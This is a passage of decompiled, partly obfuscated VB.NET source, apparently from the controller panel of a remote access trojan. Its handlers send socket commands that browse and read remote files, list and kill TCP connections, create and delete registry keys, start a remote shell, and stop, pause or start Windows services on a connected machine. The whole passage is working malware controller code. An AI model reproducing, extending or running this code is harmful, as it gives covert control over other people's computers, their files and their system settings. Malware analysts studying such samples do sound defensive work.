					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600026F RID: 623 RVA: 0x00016A44 File Offset: 0x00014C44
		Private Sub RGk_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Left
			If flag Then
				Dim isExpanded As Boolean = e.Node.IsExpanded
				If isExpanded Then
					e.Node.Collapse()
				Else
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x06000270 RID: 624 RVA: 0x00016A94 File Offset: 0x00014C94
		Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.ListView1.SelectedItems.Count <> 0
				If flag Then
					Me.cur = CType(Me.ListView1.SelectedIndices(0), Manager.CR)
					Select Case Me.cur
						Case Manager.CR.fm
							Me.FMM.BringToFront()
							Me.LPR.SendToBack()
							Me.LTCP.SendToBack()
							Me.RG.SendToBack()
							Me.RG.SendToBack()
							Me.sh.SendToBack()
							Me.LSRV.SendToBack()
							Me.L2.method_3()
						Case Manager.CR.PR
							Me.LPR.BringToFront()
							Me.LPR.method_3()
						Case Manager.CR.tcp
							Me.LTCP.BringToFront()
							Me.LTCP.method_3()
						Case Manager.CR.reg
							Me.RG.BringToFront()
						Case Manager.CR.shl
							Me.sh.BringToFront()
							Dim flag2 As Boolean = Me.shStarted = 0
							If flag2 Then
								Me.shStarted = 1
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "~" }))
							End If
						Case Manager.CR.srv
							Me.LSRV.BringToFront()
							Me.LSRV.method_3()
					End Select
					MyBase.Icon = Icon.FromHandle(CType(Me.vmethod_148.Images(Me.ListView1.SelectedItems(0).ImageIndex), Bitmap).GetHicon())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000271 RID: 625 RVA: 0x00016C9C File Offset: 0x00014E9C
		Private Sub KillConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "!" })
			Dim flag As Boolean = Me.LTCP.SelectedItems.Count <> 0
			If flag Then
				Try
					For Each obj As Object In Me.LTCP.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Tag.ToString()
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000272 RID: 626 RVA: 0x00016D7C File Offset: 0x00014F7C
		Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
		End Sub

		' Token: 0x06000273 RID: 627 RVA: 0x00016DCC File Offset: 0x00014FCC
		Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing AndAlso Me.RGk.SelectedNode.FullPath.Contains("\")
			If flag Then
				Dim text As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
				Dim flag2 As Boolean = text.Length <> 0
				If flag2 Then
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "#", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
				End If
			End If
		End Sub

		' Token: 0x06000274 RID: 628 RVA: 0x00016F24 File Offset: 0x00015124
		Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Dim fullPath As String = Me.RGk.SelectedNode.FullPath
				Dim flag2 As Boolean = fullPath.Contains("\")
				If flag2 Then
					Dim text As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1)
					Dim text2 As String = String.Empty
					Dim num As Integer = Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2
					For i As Integer = 0 To num
						text2 = text2 + Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) + "\"
					Next
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "$", Class7.string_1, text2, Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, text, "\" }))
				End If
			End If
		End Sub

		' Token: 0x06000275 RID: 629 RVA: 0x000170A8 File Offset: 0x000152A8
		Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "!", text }))
			End If
		End Sub

		' Token: 0x06000276 RID: 630 RVA: 0x0001718C File Offset: 0x0001538C
		Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "@", text }))
			End If
		End Sub

		' Token: 0x06000277 RID: 631 RVA: 0x00017270 File Offset: 0x00015470
		Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "#", text }))
			End If
		End Sub

		' Token: 0x06000278 RID: 632 RVA: 0x00017354 File Offset: 0x00015554
		Private Sub EditToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rd" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim flag2 As Boolean = Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0
						If flag2 Then
							Dim listViewItem2 As ListViewItem = listViewItem
							Dim toolTipText As String = listViewItem2.ToolTipText
							listViewItem2.ToolTipText = toolTipText
							text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag3 As Boolean = TypeOf enumerator Is IDisposable
					If flag3 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000279 RID: 633 RVA: 0x00017470 File Offset: 0x00015670
		Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x0600027A RID: 634 RVA: 0x00017510 File Offset: 0x00015710
		Private Sub vmethod_26_Tick(sender As Object, e As EventArgs)
			Me.vmethod_26.Enabled = False
			Dim flag As Boolean = Me.sk Is Nothing
			If flag Then
				MyBase.Close()
			Else
				Dim flag2 As Boolean = Not Me.sk.CN
				If flag2 Then
					MyBase.Close()
				Else
					Try
						Select Case Me.cur
							Case Manager.CR.PR
								Me.vmethod_26.Interval = 2000
								Dim flag3 As Boolean = Not Me.PRNXT
								If Not flag3 Then
									Dim enumerator As IEnumerator = Me.LPR.Items.GetEnumerator()
									Dim text As String = String.Empty
									While True
										Dim flag4 As Boolean = enumerator.MoveNext()
										If Not flag4 Then
											Exit For
										End If
										Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
										Dim flag5 As Boolean = listViewItem IsNot Nothing
										If flag5 Then
											text = text + Class7.string_1 + listViewItem.SubItems(1).Text
										End If
									End While
									Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "U", text }))
									Me.PRNXT = False
								End If
							Case Manager.CR.tcp
								Me.vmethod_26.Interval = 2000
								Dim tcpnxt As Boolean = Me.TCPNXT
								If tcpnxt Then
									Dim text2 As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "~", Class7.string_1 })
									Try
										For Each obj As Object In Me.LTCP.Items
											Dim listViewItem2 As ListViewItem = CType(obj, ListViewItem)
											text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1
										Next
									Finally
										Dim enumerator2 As IEnumerator
										Dim flag6 As Boolean = TypeOf enumerator2 Is IDisposable
										If flag6 Then
											TryCast(enumerator2, IDisposable).Dispose()
										End If
									End Try
									Me.sk.Send(text2)
									Me.TCPNXT = False
								End If
							Case Manager.CR.srv
								Me.vmethod_26.Interval = 4000
								Dim flag7 As Boolean = Me.srvNxt
								If flag7 Then
									Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "~" })
									Me.sk.Send(s)
									Me.srvNxt = False
								End If
						End Select
					Catch ex As Exception
					End Try
					Me.vmethod_26.Enabled = True
				End If
			End If
		End Sub

		' Token: 0x0600027B RID: 635 RVA: 0x0001782C File Offset: 0x00015A2C
		Private Sub L1_DoubleClick1(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedItems.Count <> 0
			If flag Then
				Me.exp(Me.L1.SelectedItems(0).ToolTipText, False)
			End If
		End Sub

		' Token: 0x0600027C RID: 636 RVA: 0x0000C421 File Offset: 0x0000A621
		Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0400015E RID: 350
		Public Cache As Collection

		' Token: 0x0400015F RID: 351
		Public cur As Manager.CR

		' Token: 0x04000160 RID: 352
		Public Flist As String

		' Token: 0x04000161 RID: 353
		Public Images As Collection

		' Token: 0x04000162 RID: 354
		Private int_0 As Integer

		' Token: 0x04000163 RID: 355
		Private int_1 As Integer

		' Token: 0x04000164 RID: 356
		Public isCut As Boolean

		' Token: 0x04000165 RID: 357
		Public PID As Integer

		' Token: 0x04000166 RID: 358
		Public PRFX As Boolean

		' Token: 0x04000167 RID: 359
		Public PRNXT As Boolean

		' Token: 0x04000168 RID: 360
		Public RGCH As Collection

		' Token: 0x04000169 RID: 361
		Public shStarted As Integer

		' Token: 0x0400016A RID: 362
		Public sk As Client

		' Token: 0x0400016B RID: 363
		Public SrvFX As Boolean

		' Token: 0x0400016C RID: 364
		Public srvNxt As Boolean

		' Token: 0x0400016D RID: 365
		Private string_0 As String

		' Token: 0x0400016E RID: 366
		Private string_1 As String()

		' Token: 0x0400016F RID: 367
		Public TCPFX As Boolean

		' Token: 0x04000170 RID: 368
		Public TCPNXT As Boolean

		' Token: 0x02000039 RID: 57
		Public Enum CR
			' Token: 0x0400028B RID: 651
			fm
			' Token: 0x0400028C RID: 652
			PR
			' Token: 0x0400028D RID: 653
			reg = 3
			' Token: 0x0400028E RID: 654
			shl
			' Token: 0x0400028F RID: 655
			srv
			' Token: 0x04000290 RID: 656
			tcp = 2
		End Enum

		' Token: 0x0200003A RID: 58
		Public NotInheritable Class GClass13
			' Token: 0x0600047F RID: 1151 RVA: 0x0002DABF File Offset: 0x0002BCBF
			Public Sub New()
				Me.list_0 = New List(Of String())()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x04000291 RID: 657
			Public list_0 As List(Of String())

			' Token: 0x04000292 RID: 658
			Public list_1 As List(Of String)

			' Token: 0x04000293 RID: 659
			Public string_0 As String
		End Class

		' Token: 0x0200003B RID: 59
		Public NotInheritable Class GClass14
			' Token: 0x06000480 RID: 1152 RVA: 0x0002DADE File Offset: 0x0002BCDE
			Public Sub New()
				Me.list_0 = New List(Of String)()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x04000294 RID: 660
			Public list_0 As List(Of String)

			' Token: 0x04000295 RID: 661
			Public list_1 As List(Of String)

			' Token: 0x04000296 RID: 662
			Public string_0 As String
		End Class
	End Class
End Namespace
